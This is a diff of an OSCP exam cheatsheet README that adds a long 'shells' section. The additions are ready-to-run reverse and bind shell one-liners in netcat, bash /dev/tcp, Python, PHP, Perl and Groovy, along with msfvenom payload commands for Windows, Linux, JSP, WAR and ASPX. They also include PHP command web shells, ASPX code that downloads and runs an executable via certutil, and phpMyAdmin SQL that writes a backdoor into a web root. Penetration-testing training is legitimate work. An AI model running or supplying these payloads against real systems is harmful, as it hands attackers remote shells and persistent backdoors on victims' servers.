@@ -1,12 +1,13 @@
 # OSCP Cheatsheet
 
-The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend and update it from time to time, so let's see where this is going. 
+The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 
 
-All of the commands are also available in a - more structured - cherry tree file.
+**THIS IS WORK IN PROGRESS**
+Once finished, all of the commands will also be available in a - more structured - cherry tree file.
 
 ## Disclaimer
-This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, use most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges become very blurred with some tools. Feel free to issue a PR if you want to help to improve the list.
-**Use for educational pruposes only!**
+This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, use most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.
+**Use for educational purposes only!**
 
 ***
 
@@ -84,7 +85,7 @@ gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/director
 
 #### Slow Scan (Check File Extensions)
 ```bash
-gobuster dir -e -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
+gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
 ```
 
 ### HTTPS
@@ -259,7 +260,7 @@ powershell.exe -NoProfile -encoded $Encoded
 
 ### Download
 ```bash
-certutil.exe -urlcache -f http://10.10.14.32/shell.exe C:\Windows\Temp\shell.exe
+certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
 ```
 
 ### Download & Execute Python Command
@@ -416,3 +417,294 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
 ```
+
+***
+
+# shells
+
+***
+
+## Upgrade Your Shell (Interactive Shell)
+```bash
+python -c 'import pty;pty.spawn("/bin/bash");' 
+```
+
+***
+
+## Enable Tab-Completion
+1. In your active shell press `bg` to send your nc session to background
+2. Enter `stty raw -echo`
+3. Enter `fg` to bring your nc session to foreground
+4. Enter `export TERM=xterm-256color`
+
+***
+
+## Catching Reverse Shells (Nc)
+rlwrap enables arrow keys on your shell.
+```bash
+rlwrap nc -nlvp 4444
+```
+
+***
+
+## Netcat
+
+### Reverse Shell
+
+#### Unix
+```bash
+nc 192.168.0.1 4444 -e /bin/bash
+```
+If `-e` is not allowed, try to find other versions of netcat
+
+```bash
+/bin/nc
+/usr/bin/ncat
+/bin/netcat
+/bin/nc.traditional
+```
+#### Windows
+```bash
+nc 192.168.0.1 4444 -e cmd.exe
+```
+
+### Bind shell
+
+#### Unix
+
+Victim:
+```bash
+nc -nlvp 4444 -e /bin/bash
+```
+Attacker:
+```bash
+nc 192.168.0.1 4444
+```
+
+#### Windows
+
+Victim:
+```bash
+nc -nlvp 4444 -e cmd.exe
+```
+Attacker:
+```bash
+nc 192.168.0.1 4444
+```
+
+***
+
+## Bash
+
+```bash
+/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
+```
+
+***
+
+## Python
+
+### As Command
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+### Python Code
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+```
+
+***
+
+## PHP
+
+### Kali Default PHP Reverse Shell
+```bash
+cat /usr/share/webshells/php/php-reverse-shell.php
+```
+
+### Kali Default PHP CMD Shell
+```bash
+cat /usr/share/webshells/php/php-backdoor.php
+```
+
+### PHP Reverse Shell
+Version 1:
+```bash
+<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>
+```
+
+Version 2:
+```bash
+<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2 >& 3");?>
+```
+
+As Command:
+```bash
+php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### CMD Shell
+```bash
+<?php echo system($_REQUEST["cmd"]); ?>
+```
+Call the CMD shell:
+```bash
+http://192.168.0.1/cmd_shell.php?cmd=whoami
+```
+
+### WhiteWinterWolf Webshell
+
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+
+***
+
+## MSFVENOM
+
+### Windows Binary (.exe)
+#### 32 Bit (x86)
+Reverse Shell:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
+```
+
+Bind Shell:
+```bash
+msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
+```
+
+Output in Hex, C Style, Exclude bad chars, Exitfunction thread:
+```bash
+msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+```
+
+#### 64 Bit (x64)
+Reverse Shell:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
+```
+
+Bind Shell:
+```bash
+msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
+```
+
+Meterpreter:
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
+```
+
+### Linux Binary (.elf)
+#### 32 Bit (x86)
+Reverse Shell:
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
+```
+
+Bind Shell:
+```bash
+msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
+```
+
+#### 64 Bit (x64)
+Reverse Shell:
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
+```
+
+Bind Shell:
+```bash
+msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
+```
+
+### Java Server Pages (.jsp)
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
+```
+
+As .war:
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
+```
+
+### Active Sever Pages Extended (aspx)
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
+```
+
+***
+
+## Active Sever Pages Extended (aspx)
+
+### Transfer A File (Certutil)
+```bash
+<% 
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
+
+### Execute a File
+```bash
+<% 
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
+
+***
+
+## Jenkins / Groovy (Java)
+
+### Linux Reverse Shell
+```Java
+String host="192.168.0.1";
+int port=4444;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+### Windows Reverse Shell
+```Java
+String host="192.168.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+***
+
+## Perl
+
+### Reverse Shell
+```perl
+perl -MIO -e 'use Socket;$ip="172.16.1.1";$port=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+***
+
+## PhpmyAdmin
+
+Write a CMD shell into a file with the right permissions. Issue the following select:
+(Try different paths for different webservers)
+
+Windows
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+```
+
+Unix
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
+```
+
+***
